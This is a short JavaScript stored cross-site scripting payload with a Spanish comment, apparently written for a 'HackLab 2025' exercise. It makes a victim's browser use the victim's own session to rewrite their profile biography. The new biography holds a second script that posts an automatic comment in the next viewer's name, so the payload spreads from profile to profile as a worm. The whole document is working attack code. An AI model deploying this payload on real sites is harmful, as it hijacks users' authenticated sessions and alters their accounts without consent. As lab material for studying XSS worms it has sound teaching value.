<script>
// Cuando Pepe vea este comentario, modificará SU biografía
fetch('/profile', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'bio=' + encodeURIComponent('<script>fetch("/comments",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"comment=¡Jeni comenta automáticamente! HackLab 2025"})</' + 'script>')
});
</script>
